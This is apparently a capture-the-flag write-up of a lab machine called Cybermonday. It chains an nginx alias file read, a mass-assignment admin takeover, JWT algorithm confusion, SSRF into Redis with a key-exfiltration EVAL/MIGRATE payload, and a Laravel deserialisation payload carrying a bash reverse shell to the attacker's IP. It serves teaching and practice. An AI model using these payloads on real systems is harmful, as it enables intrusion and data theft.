# Cybermonday

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 4000 10.129.214.150         
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-21 15:25 +08
Nmap scan report for 10.129.214.150
Host is up (0.17s latency).
Not shown: 64394 closed tcp ports (conn-refused), 1139 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Did a detailed scan as well:

```
$ nmap -p 80 -sC -sV --min-rate 4000 10.129.214.150
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-21 15:26 +08
Nmap scan report for 10.129.214.150
Host is up (0.17s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.25.1
|_http-server-header: nginx/1.25.1
|_http-title: Did not follow redirect to http://cybermonday.htb
```

We can add this host to our `/etc/hosts` file.

### Web Enumeration --> Misconfigured Nginx Alias LFI

The website shows a shop:

<figure><img src="../../.gitbook/assets/image (4184).png" alt=""><figcaption></figcaption></figure>

There are a few products available:

<figure><img src="../../.gitbook/assets/image (4185).png" alt=""><figcaption></figcaption></figure>

When the traffic is proxied, we can see that there are some JWT tokens being passed around:

<figure><img src="../../.gitbook/assets/image (4186).png" alt=""><figcaption></figcaption></figure>

I tried creating a user and logging in.&#x20;

<figure><img src="../../.gitbook/assets/image (4187).png" alt=""><figcaption></figcaption></figure>

The site is powered by PHP based on the `X-Powered-By` header. Since there was nothing much here, I did a `feroxbuster` scan to view the hidden directories. This revealed the `assets` directories with loads of stuff, but I couldn't really use all of it.&#x20;

Since this was an `nginx` server, I checked Hacktricks and tested a few things, such as the `nginx` LFI exploit:

<figure><img src="../../.gitbook/assets/image (4188).png" alt=""><figcaption></figcaption></figure>

This caused a `403` to be returned, indicating that it might work. `gobuster` confirms this:

```
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/dirsearch.txt -u http://cybermonday.htb/assets../
/.                    (Status: 403) [Size: 153]
/.dockerignore        (Status: 200) [Size: 10]
/.env.example         (Status: 200) [Size: 912]
/.git/                (Status: 403) [Size: 153]
```

We can dump out the `.git` repository we found using `git-dumper`:

```
$ ./git_dumper.py http://cybermonday.htb/assets../.git ~/htb/cybermonday/git
```

I also read the `.env` file using this method:

```
APP_NAME=CyberMonday
APP_ENV=local
APP_KEY=base64:EX3zUxJkzEAY2xM4pbOfYMJus+bjx6V25Wnas+rFMzA=
APP_DEBUG=true
APP_URL=http://cybermonday.htb

LOG_CHANNEL=stack
LOG_DEPRECATIONS_CHANNEL=null
LOG_LEVEL=debug

DB_CONNECTION=mysql
DB_HOST=db
DB_PORT=3306
DB_DATABASE=cybermonday
DB_USERNAME=root
DB_PASSWORD=root

BROADCAST_DRIVER=log
CACHE_DRIVER=file
FILESYSTEM_DISK=local
QUEUE_CONNECTION=sync
SESSION_DRIVER=redis
SESSION_LIFETIME=120

MEMCACHED_HOST=127.0.0.1

REDIS_HOST=redis
REDIS_PASSWORD=
REDIS_PORT=6379
REDIS_PREFIX=laravel_session:
CACHE_PREFIX=

MAIL_MAILER=smtp
MAIL_HOST=mailhog
MAIL_PORT=1025
MAIL_USERNAME=null
MAIL_PASSWORD=null
MAIL_ENCRYPTION=null
MAIL_FROM_ADDRESS="hello@example.com"
MAIL_FROM_NAME="${APP_NAME}"

AWS_ACCESS_KEY_ID=
AWS_SECRET_ACCESS_KEY=
AWS_DEFAULT_REGION=us-east-1
AWS_BUCKET=
AWS_USE_PATH_STYLE_ENDPOINT=false

PUSHER_APP_ID=
PUSHER_APP_KEY=
PUSHER_APP_SECRET=
PUSHER_APP_CLUSTER=mt1

MIX_PUSHER_APP_KEY="${PUSHER_APP_KEY}"
MIX_PUSHER_APP_CLUSTER="${PUSHER_APP_CLUSTER}"

CHANGELOG_PATH="/mnt/changelog.txt"

REDIS_BLACKLIST=flushall,flushdb
```

We seem to have an `APP_KEY` variable that might be handy later. Redis is also present on the machine.&#x20;

### Source Code Review --> Admin Takeover

There were quite a lot of files from the repository.&#x20;

```
$ ls
app        composer.json  database      phpunit.xml  resources  tests
artisan    composer.lock  lang          public       routes     webpack.mix.js
bootstrap  config         package.json  README.md    storage
```

This was using the Laravel framework to operate, as most of the backend code is written in PHP. The `routes/web.php` file contained some information about the admin dashboard:

```php
Route::prefix('dashboard')->middleware('auth.admin')->group(function(){
        
    Route::get('/',[DashboardController::class,'index'])->name('dashboard');

    Route::get('/products',[ProductController::class,'create'])->name('dashboard.products');
    Route::post('/products',[ProductController::class,'store'])->name('dashboard.products.store');
    
    Route::get('/changelog',[ChangelogController::class,'index'])->name('dashboard.changelog');

});
```

The `ProfileController.php` file was the one used to update the user's password:

```php
<?php

namespace App\Http\Controllers;

use App\Models\User;
use Illuminate\Http\Request;

class ProfileController extends Controller
{
    public function index()
    {
        return view('home.profile', [
            'title' => 'Profile'
        ]);
    }

    public function update(Request $request)
    {
        $data = $request->except(["_token","password","password_confirmation"]);
        $user = User::where("id", auth()->user()->id)->first();

        if(isset($request->password) && !empty($request->password))
        {
            if($request->password != $request->password_confirmation)
            {
                session()->flash('error','Password dont match');
                return back();
            }

            $data['password'] = bcrypt($request->password);
        }

        $user->update($data);
        session()->flash('success','Profile updated');

        return back();
    }
}
```

The next thing I wanted to find out was how the application determines if a user is an administrator or not, and the `User.php` file within `app/Models` has just that:

```php
<?php

namespace App\Models;

use Illuminate\Contracts\Auth\MustVerifyEmail;
use Illuminate\Database\Eloquent\Factories\HasFactory;
use Illuminate\Foundation\Auth\User as Authenticatable;
use Illuminate\Notifications\Notifiable;
use Laravel\Sanctum\HasApiTokens;

class User extends Authenticatable
{
    use HasApiTokens, HasFactory, Notifiable;

    /**
     * The attributes that are mass assignable.
     *
     * @var array<int, string>
     */

    protected $guarded = [
        'remember_token'
    ];

    /**
     * The attributes that should be hidden for serialization.
     *
     * @var array<int, string>
     */
    protected $hidden = [
        'password',
        'remember_token',
    ];

    /**
     * The attributes that should be cast.
     *
     * @var array<string, string>
     */
    protected $casts = [
        'isAdmin' => 'boolean',
        'email_verified_at' => 'datetime',
    ];

    public function insert($data)
    {
        $data['password'] = bcrypt($data['password']);
        return $this->create($data);
    }

}

```

It seems that there's an `isAdmin` boolean variable being set. We can change this to have a value of 1. Based on the code for the Profile Update, it seems to be taking parameters and directly passing them into the database.&#x20;

I appended `isAdmin=1` to the end of the POST parameters and updated my user's profile, which worked since the Dashboard appeared!

<figure><img src="../../.gitbook/assets/image (4189).png" alt=""><figcaption></figcaption></figure>

### Admin Dashboard --> Webhook Subdomain

The changelog of the administrator's dashboard was the most interesting:

<figure><img src="../../.gitbook/assets/image (4190).png" alt=""><figcaption></figcaption></figure>

The link redirected us to `webhooks-api-beta.cybermonday.htb`, which we can add to the `hosts` file. Visiting that site revealed some kind of API:

<figure><img src="../../.gitbook/assets/image (4191).png" alt=""><figcaption></figcaption></figure>

Webhooks open up the possibilities of SSRF, and from the earlier `.env` file, we know that this machine uses Redis on port 6379, which we might need to interact with to get a password or something. The `sendRequest` action seems to be vulnerable to SSRF somehow.&#x20;

To use this API, we first need to create a user.&#x20;

<figure><img src="../../.gitbook/assets/image (4192).png" alt=""><figcaption></figcaption></figure>

Afterwards, logging in would return an `x-access-token` for us to use:

<figure><img src="../../.gitbook/assets/image (4193).png" alt=""><figcaption></figcaption></figure>

However, we are not authorized to create webhooks on this site with this token:

<figure><img src="../../.gitbook/assets/image (4194).png" alt=""><figcaption></figcaption></figure>

It's worth noting that the JWT token stored contains our user ID and our username:

<figure><img src="../../.gitbook/assets/image (4195).png" alt=""><figcaption></figcaption></figure>

There should be a way to spoof this token or get the secret required.&#x20;

### Algorithm Confusion --> Webhooks Access

I did a few scans using different wordlists via `gobuster`, and found some interesting stuff:

```
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.-u http://webhooks-api-beta.cybermonday.htb
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://webhooks-api-beta.cybermonday.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/dirsearch.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2023/08/21 18:04:09 Starting gobuster in directory enumeration mode
===============================================================
/%2e%2e//google.com   (Status: 400) [Size: 157]
/.htaccess            (Status: 200) [Size: 602]
/.htaccess/           (Status: 200) [Size: 602]
/jwks.json            (Status: 200) [Size: 447]
```

There was a `jwks.json` file present, and here's the contents of the file:

```json
{
  "keys": [
    {
      "kty": "RSA",
      "use": "sig",
      "alg": "RS256",
      "n": "pvezvAKCOgxwsiyV6PRJfGMul-WBYorwFIWudWKkGejMx3onUSlM8OA3PjmhFNCP_8jJ7WA2gDa8oP3N2J8zFyadnrt2Xe59FdcLXTPxbbfFC0aTGkDIOPZYJ8kR0cly0fiZiZbg4VLswYsh3Sn797IlIYr6Wqfc6ZPn1nsEhOrwO-qSD4Q24FVYeUxsn7pJ0oOWHPD-qtC5q3BR2M_SxBrxXh9vqcNBB3ZRRA0H0FDdV6Lp_8wJY7RB8eMREgSe48r3k7GlEcCLwbsyCyhngysgHsq6yJYM82BL7V8Qln42yij1BM7fCu19M1EZwR5eJ2Hg31ZsK5uShbITbRh16w",                
      "e": "AQAB"
    }
  ]
}
```

Seems that we have extra algorithm information about the JWT. When searching for exploits pertaining to this file, I found a page talking a bit about Algorithm Confusion exploits:

{% embed url="https://infosecwriteups.com/jwt-json-web-tokens-explanation-exploitation-0x02-cea23008314f" %}

Portswigger has done something similar as well:

{% embed url="https://portswigger.net/web-security/jwt/algorithm-confusion" %}

Using `jwt_tool.py` (which I found on Hacktricks), we can create another `.pem` file to use:

```
$ python3 jwt_tool.py -t http://webhooks-api-beta.cybermonday.htb/webhooks -rh "x-access-token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpZCI6MiwidXNlcm5hbWUiOiJ0ZXN0MTIzIiwicm9sZSI6InVzZXIifQ.adbQGkwEojcmkdP4XceOZq_eYLJSLaJ1aBvWDyOKR8h_4BfYoCJlZxvxV-wbY6U0Cm6qU1-sijcL9J15wMgn5rqcNyM_vy_UOGl-Ja3x9uXUWTLX6tZ2-_ki4YuDaWtDYQ49LdchXo6lJnRvf6y3xFflXFN7tXbC46uTIWYB58Z2vcF6VEKpj1lPh84yxqldx_rzooE3EDvZK52q_XNvUQynNfIGYmyc-maZCU5VwtZdAv9JRyPO1DD-B8lf1Jps-QM5_HZr_hvijA5au5z8r-SztsHZhf226H4D6aK_0pqNOFfDg9fN5hMKlgoM9FCO8HPHwDlJHNiVWO92DpEVVA" -V -jw ../jwks.json 

        \   \        \         \          \                    \ 
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.6                \______|             @ticarpi      

Original JWT: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpZCI6MiwidXNlcm5hbWUiOiJ0ZXN0MTIzIiwicm9sZSI6InVzZXIifQ.adbQGkwEojcmkdP4XceOZq_eYLJSLaJ1aBvWDyOKR8h_4BfYoCJlZxvxV-wbY6U0Cm6qU1-sijcL9J15wMgn5rqcNyM_vy_UOGl-Ja3x9uXUWTLX6tZ2-_ki4YuDaWtDYQ49LdchXo6lJnRvf6y3xFflXFN7tXbC46uTIWYB58Z2vcF6VEKpj1lPh84yxqldx_rzooE3EDvZK52q_XNvUQynNfIGYmyc-maZCU5VwtZdAv9JRyPO1DD-B8lf1Jps-QM5_HZr_hvijA5au5z8r-SztsHZhf226H4D6aK_0pqNOFfDg9fN5hMKlgoM9FCO8HPHwDlJHNiVWO92DpEVVA             
                                                                                             
JWKS Contents:
Number of keys: 1

--------                                                                                     
Key 1
Key 1
[+] kty = RSA
[+] use = sig
[+] alg = RS256
[+] n = pvezvAKCOgxwsiyV6PRJfGMul-WBYorwFIWudWKkGejMx3onUSlM8OA3PjmhFNCP_8jJ7WA2gDa8oP3N2J8zFyadnrt2Xe59FdcLXTPxbbfFC0aTGkDIOPZYJ8kR0cly0fiZiZbg4VLswYsh3Sn797IlIYr6Wqfc6ZPn1nsEhOrwO-qSD4Q24FVYeUxsn7pJ0oOWHPD-qtC5q3BR2M_SxBrxXh9vqcNBB3ZRRA0H0FDdV6Lp_8wJY7RB8eMREgSe48r3k7GlEcCLwbsyCyhngysgHsq6yJYM82BL7V8Qln42yij1BM7fCu19M1EZwR5eJ2Hg31ZsK5uShbITbRh16w                      
[+] e = AQAB

Found RSA key factors, generating a public key                                               
[+] kid_0_1692612611.pem

Attempting to verify token using kid_0_1692612611.pem                                        
RSA Signature is VALID
```

With this PEM, we can spoof tokens by changing the algorithm to HS256 instead of RS256. RS256 requires a public and private key, whereas HS256 only requires one key. SInce we have changed the algorithm used, the HS256 algorithm would use the **public PEM key** to sign the token.&#x20;

I used Burpsuite extensions (JOSEPH and JWT Editor Keys) to attack this. First, we can edit the JWT to have this as the payload and header:

<figure><img src="../../.gitbook/assets/image (4196).png" alt=""><figcaption></figcaption></figure>

Afterwards, we can sign the token using the PEM string we got earlier using JOSEPH. Since JWTs are 3 separate fields separated by `.` characters, I just removed the signature part of the token from JWT Editor Keys:

<figure><img src="../../.gitbook/assets/image (4197).png" alt=""><figcaption></figcaption></figure>

Using this token, we can then access the `/webhooks` endpoint:

<figure><img src="../../.gitbook/assets/image (4198).png" alt=""><figcaption></figcaption></figure>

### Redis SSRF --> Deserialisation RCE

> Had some help here.

Now that we can create our own webhooks, we create a webhook with the `action` parameter set to `sendRequest`:

<figure><img src="../../.gitbook/assets/image (4199).png" alt=""><figcaption></figcaption></figure>

Using this, we can then send requests from the server:

```http
POST /webhooks/6b1bca72-ecdd-4066-9cd9-8e739334eea1 HTTP/1.1
Host: webhooks-api-beta.cybermonday.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
x-access-token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6MSwidXNlcm5hbWUiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.hsjDWoGJbgx_ygJe9nlfu4dNZHUZuF3Igy43NfKQ7aE
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/json
Content-Length: 51



{"url":"http://10.10.14.32/iamssrf","method":"GET"}
```

<figure><img src="../../.gitbook/assets/image (4200).png" alt=""><figcaption></figcaption></figure>

Attempts to use any other protocol fails:

<figure><img src="../../.gitbook/assets/image (4201).png" alt=""><figcaption></figcaption></figure>

Very early on, we saw that we had a Redis server operating on the server when we read the `.env` file through the `nginx` LFI exploit. I know that its possible to interact with Redis through HTTP requests, and the SSRF for this machine returns the message retrieved from its request.

From the `.env` file, the `REDIS_HOST` variable is set to `redis`, indicating that we have to use that. On the Hacktricks page for Redis, there's an interesting part that talks about `slaveof`.&#x20;

<figure><img src="../../.gitbook/assets/image (4202).png" alt=""><figcaption></figcaption></figure>

I used this JSON object:

```
{"url":"http://redis:6379/","method":"slaveof 10.10.14.32 6379\r\n"}
```

When I opened a listener port, this is what I got:

<figure><img src="../../.gitbook/assets/image (4203).png" alt=""><figcaption></figcaption></figure>

Hacktricks mentions that we might be able to control the master instance (the machine) with our slave. This means that we could potentially read stuff within the machine. To exploit this, we can first create a `redis-server` to accept incoming connections and retrieve output from the commands I sent via webhooks.

I found a blog in Chinese that does cover this a bit:

{% embed url="https://zhuanlan.zhihu.com/p/349407426" %}

Following this, I started a `redis-server` with the protected mode turned off to allow connections from anywhere:

````
$ redis-server --protected-mode no
55358:C 24 Aug 2023 22:02:32.141 # oO0OoO0OoO0Oo Redis is starting oO0OoO0OoO0Oo
55358:C 24 Aug 2023 22:02:32.141 # Redis version=7.0.5, bits=64, commit=00000000, modified=0, pid=55358, just started
55358:C 24 Aug 2023 22:02:32.141 # Configuration loaded
55358:M 24 Aug 2023 22:02:32.141 * Increased maximum number of open files to 10032 (it was originally set to 1024).
55358:M 24 Aug 2023 22:02:32.141 * monotonic clock: POSIX clock_gettime
                _._                                                  
           _.-``__ ''-._                                             
      _.-``    `.  `_.  ''-._           Redis 7.0.5 (00000000/0) 64 bit
  .-`` .-```.  ```\/    _.,_ ''-._                                  
 (    '      ,       .-`  | `,    )     Running in standalone mode
 |`-._`-...-` __...-.``-._|'` _.-'|     Port: 6379
 |    `-._   `._    /     _.-'    |     PID: 55358
  `-._    `-._  `-./  _.-'    _.-'                                   
 |`-._`-._    `-.__.-'    _.-'_.-'|                                  
 |    `-._`-._        _.-'_.-'    |           https://redis.io       
  `-._    `-._`-.__.-'_.-'    _.-'                                   
 |`-._`-._    `-.__.-'    _.-'_.-'|                                  
 |    `-._`-._        _.-'_.-'    |                                  
  `-._    `-._`-.__.-'_.-'    _.-'                                   
      `-._    `-.__.-'    _.-'                                       
          `-._        _.-'                                           
              `-.__.-'                                               

55358:M 24 Aug 2023 22:02:32.141 # Server initialized
55358:M 24 Aug 2023 22:02:32.141 # WARNING overcommit_memory is set to 0! Background save may fail under low memory condition. To fix this issue add 'vm.overcommit_memory = 1' to /etc/sysctl.conf and then reboot or run the command 'sysctl vm.overcommit_memory=1' for this to take effect.
55358:M 24 Aug 2023 22:02:32.142 * Loading RDB produced by version 7.0.5
55358:M 24 Aug 2023 22:02:32.142 * RDB age 4 seconds
55358:M 24 Aug 2023 22:02:32.142 * RDB memory usage when created 0.84 Mb
55358:M 24 Aug 2023 22:02:32.142 * Done loading RDB, keys loaded: 0, keys expired: 0.
55358:M 24 Aug 2023 22:02:32.142 * DB loaded from disk: 0.000 seconds
55358:M 24 Aug 2023 22:02:32.142 * Ready to accept connections
55358:M 24 Aug 2023 22:02:32.442 * Replica 10.129.65.142:6379 asks for synchronization
55358:M 24 Aug 2023 22:02:32.442 * Partial resynchronization not accepted: Replication ID mismatch (Replica asked for '520da79bde0fb674df0c059e7980ebba25040e40', my replication IDs are '878522e90fcf26e6072f9c4cc8a0d62d4a787242' and '0000000000000000000000000000000000000000')
55358:M 24 Aug 2023 22:02:32.442 * Replication backlog created, my new replication IDs are 'e541c01323ce2bfa0006957e83989894730c2cb7' and '0000000000000000000000000000000000000000'
55358:M 24 Aug 2023 22:02:32.442 * Delay next BGSAVE for diskless SYNC
55358:M 24 Aug 2023 22:02:37.169 * Starting BGSAVE for SYNC with target: replicas sockets
55358:M 24 Aug 2023 22:02:37.170 * Background RDB transfer started by pid 55383
55383:C 24 Aug 2023 22:02:37.170 * Fork CoW for RDB: current 0 MB, peak 0 MB, average 0 MB
55358:M 24 Aug 2023 22:02:37.171 # Diskless rdb transfer, done reading from pipe, 1 replicas still up.
55358:M 24 Aug 2023 22:02:37.185 * Background RDB transfer terminated with success
55358:M 24 Aug 2023 22:02:37.185 * Streamed RDB transfer with replica 10.129.65.142:6379 succeeded (socket). Waiting for REPLCONF ACK from slave to enable streaming
55358:M 24 Aug 2023 22:02:37.185 * Synchronization with replica 10.129.65.142:6379 succeeded
````

With this, we now need a way to export all the keys from the remote Redis server to our local machine. We can do so with this command I found here:

{% embed url="https://github.com/dxa4481/whatsinmyredis" %}

This was the payload I used:

{% code overflow="wrap" %}
```json
{"url":"http://redis:6379/","method":"EVAL 'for k,v in pairs(redis.call(\"KEYS\", \"*\")) do redis.pcall(\"MIGRATE\",\"10.10.14.32\",\"6379\",v,0,200) end' 0\r\n*1\r\n$20\r\n"}
```
{% endcode %}

The last parts are for handling the arguments passed to Redis:

<figure><img src="../../.gitbook/assets/image (4204).png" alt=""><figcaption></figcaption></figure>

Afterwards, we need to replicate the remote Redis database to our own. This would allow us to write to the remote Redis database if we need to:

```json
{"url":"http://redis:6379/","method":"CONFIG SET replica-read-only no\r\n\r\n"}
```

We might obtain a read only replica error, which can be fixed with this:

```json
{"url":"http://redis:6379/","method":"CONFIG SET replica-read-only no\r\n\r\n"}
```

After all of this, we can use `redis-cli` to view the keys present:

{% code overflow="wrap" %}
```
$ redis-cli -h 127.0.0.1 -p 6379
127.0.0.1:6379> keys *
1) "laravel_session:uVlrclU6uti6bHeLM5qBhACuOsqEL0f1GASURNgH"
127.0.0.1:6379> get laravel_session:uVlrclU6uti6bHeLM5qBhACuOsqEL0f1GASURNgH
"s:247:\"a:4:{s:6:\"_token\";s:40:\"oAXl7Y1nw3REQ4KyL8GypmaxAUjJP5tkfA3N4n73\";s:9:\"_previous\";a:1:{s:3:\"url\";s:27:\"http://cybermonday.htb/home\";}s:6:\"_flash\";a:2:{s:3:\"old\";a:0:{}s:3:\"new\";a:0:{}}s:50:\"login_web_59ba36addc2b2f9401580f014c7f58ea4e30989d\";i:2;}\";"
```
{% endcode %}

Since we have the `APP_KEY` variable retrieved earlier from the `.env` file, we can decode this cookie and potentially change it to have a reverse shell payload (if its being deserialised).&#x20;

We can decrypt the `cybermonday_session` JWT token using this script from Hacktricks:

{% code overflow="wrap" %}
```python
import os
import json
import hashlib
import sys
import hmac
import base64
import string
import requests
from Crypto.Cipher import AES
from phpserialize import loads, dumps

#https://gist.github.com/bluetechy/5580fab27510906711a2775f3c4f5ce3

def mcrypt_decrypt(value, iv):
    global key
    AES.key_size = [len(key)]
    crypt_object = AES.new(key=key, mode=AES.MODE_CBC, IV=iv)
    return crypt_object.decrypt(value)


def mcrypt_encrypt(value, iv):
    global key
    AES.key_size = [len(key)]
    crypt_object = AES.new(key=key, mode=AES.MODE_CBC, IV=iv)
    return crypt_object.encrypt(value)


def decrypt(bstring):
    global key
    dic = json.loads(base64.b64decode(bstring).decode())
    mac = dic['mac']
    value = bytes(dic['value'], 'utf-8')
    iv = bytes(dic['iv'], 'utf-8')
    if mac == hmac.new(key, iv+value, hashlib.sha256).hexdigest():
        return mcrypt_decrypt(base64.b64decode(value), base64.b64decode(iv))
        #return loads(mcrypt_decrypt(base64.b64decode(value), base64.b64decode(iv))).decode()
    return ''


def encrypt(string):
    global key
    iv = os.urandom(16)
    #string = dumps(string)
    padding = 16 - len(string) % 16
    string += bytes(chr(padding) * padding, 'utf-8')
    value = base64.b64encode(mcrypt_encrypt(string, iv))
    iv = base64.b64encode(iv)
    mac = hmac.new(key, iv+value, hashlib.sha256).hexdigest()
    dic = {'iv': iv.decode(), 'value': value.decode(), 'mac': mac}
    return base64.b64encode(bytes(json.dumps(dic), 'utf-8'))

app_key ='EX3zUxJkzEAY2xM4pbOfYMJus+bjx6V25Wnas+rFMzA='
key = base64.b64decode(app_key)
print(decrypt('eyJpdiI6InFReUpScXptMG4xcnRzT0hWKzF1d0E9PSIsInZhbHVlIjoiZ3l1NjgvTGVhZnRIK05RRnNOM3N2ZWVLOTFkekhrSDNOTnl1SFdPNTQvcmhlbUhQN1FyMFBHT29ncEVlTWlFeG00WFN2WlI2cU1MU1RkNXBpZm1rL3lPK21RUTZRZlBNM2hjYzRKN01jNzFNb3pLNldZdGNMcTYrTEFtMlFXYnQiLCJtYWMiOiI0NWU5YzFlNTQyZTIxYWE1NjFiODE0ODM3YWZkMGY3YTg5MGQwNzQyZWU0MDU0MjRhNzUzYzVjYmIxMmEyMzJiIiwidGFnIjoiIn0='))
```
{% endcode %}

{% code overflow="wrap" %}
```
$ python3 dec.py
b'25c6a7ecd50b519b7758877cdc95726f29500d4c|uVlrclU6uti6bHeLM5qBhACuOsqEL0f1GASURNgH\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f'
```
{% endcode %}

This gives the `laravel_session` cookie ID. Using this, we can attempt to set this to a PHP serialised object to get RCE since the `cybermonday_session` uses this value since we can manipulate the cookie value.

{% embed url="https://github.com/ambionics/phpggc" %}

After some testing, I found that `Laravel/RCE16` is the correct gadget chain to use:

{% code overflow="wrap" %}
```
$ ./phpggc -f -a Laravel/RCE16 system 'bash -c "bash -i >& /dev/tcp/10.10.14.32/443 0>&1 2<&1"'
a:2:{i:7;O:35:"Monolog\Handler\RotatingFileHandler":4:{S:13:"\00*\00mustRotate";b:1;S:11:"\00*\00filename";S:8:"anything";S:17:"\00*\00filenameFormat";O:38:"Illuminate\Validation\Rules\RequiredIf":1:{S:9:"condition";a:2:{i:0;O:28:"Illuminate\Auth\RequestGuard":3:{S:11:"\00*\00callback";S:14:"call_user_func";S:10:"\00*\00request";S:6:"system";S:11:"\00*\00provider";S:55:"bash -c "bash -i >& /dev/tcp/10.10.14.32/443 0>&1 2<&1"";}i:1;S:4:"user";}}S:13:"\00*\00dateFormat";S:1:"l";}i:7;i:7;}
```
{% endcode %}

Afterwards, I set the value of the cookie to my payload:

{% code overflow="wrap" %}
```
127.0.0.1:6379> set 'laravel_session:uVlrclU6uti6bHeLM5qBhACuOsqEL0f1GASURNgH' 'a:2:{i:7;O:35:"Monolog\Handler\RotatingFileHandler":4:{S:13:"\00*\00mustRotate";b:1;S:11:"\00*\00filename";S:8:"anything";S:17:"\00*\00filenameFormat";O:38:"Illuminate\Validation\Rules\RequiredIf":1:{S:9:"condition";a:2:{i:0;O:28:"Illuminate\Auth\RequestGuard":3:{S:11:"\00*\00callback";S:14:"call_user_func";S:10:"\00*\00request";S:6:"system";S:11:"\00*\00provider";S:55:"bash -c "bash -i >& /dev/tcp/10.10.14.32/443 0>&1 2<&1"";}i:1;S:4:"user";}}S:13:"\00*\00dateFormat";S:1:"l";}i:7;i:7;}'
```
{% endcode %}

Upon refreshing the page, I got a shell as `www-data`:

<figure><img src="../../.gitbook/assets/image (4205).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation 1

### Docker Escape --> MySQL

We are in a Docker container, so let's look for ways to escape this thing. I first checked the environment variables, and there were quite a few:

```
www-data@070370e2cdc4:/$ env
DB_PASSWORD=root
MAIL_PORT=1025
REDIS_PASSWORD=
LOG_LEVEL=debug
HOSTNAME=070370e2cdc4
PHP_VERSION=8.1.20
REDIS_BLACKLIST=flushall,flushdb
REDIS_HOST=redis
PHP_INI_DIR=/usr/local/etc/php
GPG_KEYS=528995BFEDFBA7191D46839EF9BA0ADA31CBD89E 39B641343D8C104B2B146DC3F9C39DC0B9698544 F1F692238FBC1666E5A5CCD4199F9DFEF6FFBAFD
AWS_DEFAULT_REGION=us-east-1
PHP_LDFLAGS=-Wl,-O1 -pie
MIX_PUSHER_APP_CLUSTER=mt1
MEMCACHED_HOST=127.0.0.1
PWD=/
CACHE_DRIVER=file
MAIL_FROM_ADDRESS=hello@example.com
CHANGELOG_PATH=/mnt/changelog.txt
DB_PORT=3306
MAIL_MAILER=smtp
HOME=/var/www
CACHE_PREFIX=
PUSHER_APP_CLUSTER=mt1
MAIL_USERNAME=null
FILESYSTEM_DISK=local
APP_KEY=base64:EX3zUxJkzEAY2xM4pbOfYMJus+bjx6V25Wnas+rFMzA=
APP_ENV=local
MAIL_PASSWORD=null
APP_DEBUG=true
AWS_SECRET_ACCESS_KEY=
APP_URL=http://cybermonday.htb
PHP_SHA256=4c9973f599e93ed5e8ce2b45ce1d41bb8fb54ce642824fd23e56b52fd75029a6
PHPIZE_DEPS=autoconf            dpkg-dev                file            g++             gcc libc-dev                 make            pkg-config              re2c
DB_USERNAME=root
LOG_DEPRECATIONS_CHANNEL=null
PUSHER_APP_ID=
DB_CONNECTION=mysql
REDIS_PREFIX=laravel_session:
DB_HOST=db
PHP_URL=https://www.php.net/distributions/php-8.1.20.tar.xz
PUSHER_APP_KEY=
USER=www-data
PUSHER_APP_SECRET=
MIX_PUSHER_APP_KEY=
APP_NAME=CyberMonday
SHLVL=3
AWS_ACCESS_KEY_ID=
AWS_USE_PATH_STYLE_ENDPOINT=false
LOG_CHANNEL=stack
PHP_CFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64
QUEUE_CONNECTION=sync
BROADCAST_DRIVER=log
MAIL_FROM_NAME=CyberMonday
AWS_BUCKET=
REDIS_PORT=6379
SESSION_DRIVER=redis
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
MAIL_ENCRYPTION=null
MAIL_HOST=mailhog
DB_DATABASE=cybermonday
SESSION_LIFETIME=120
PHP_ASC_URL=https://www.php.net/distributions/php-8.1.20.tar.xz.asc
PHP_CPPFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64
_=/usr/bin/env
OLDPWD=/dev
```

One of the things that stood out was the `changelog.txt` within `/mnt`, and within it I found the user flag:

{% code overflow="wrap" %}
```
www-data@070370e2cdc4:/mnt$ ls -la
total 40
drwxr-xr-x 5 1000 1000 4096 Aug  3 09:51 .
drwxr-xr-x 1 root root 4096 Jul  3 05:00 ..
lrwxrwxrwx 1 root root    9 Jun  4 02:07 .bash_history -> /dev/null
-rw-r--r-- 1 1000 1000  220 May 29 15:12 .bash_logout
-rw-r--r-- 1 1000 1000 3526 May 29 15:12 .bashrc
drwxr-xr-x 3 1000 1000 4096 Aug  3 09:51 .local
-rw-r--r-- 1 1000 1000  807 May 29 15:12 .profile
drwxr-xr-x 2 1000 1000 4096 Aug  3 09:51 .ssh
-rw-r--r-- 1 root root  701 May 29 23:26 changelog.txt
drwxrwxrwx 2 root root 4096 Aug  3 09:51 logs
-rw-r----- 1 root 1000   33 Aug 24 14:15 user.txt

www-data@070370e2cdc4:/mnt/.ssh$ cat authorized_keys 
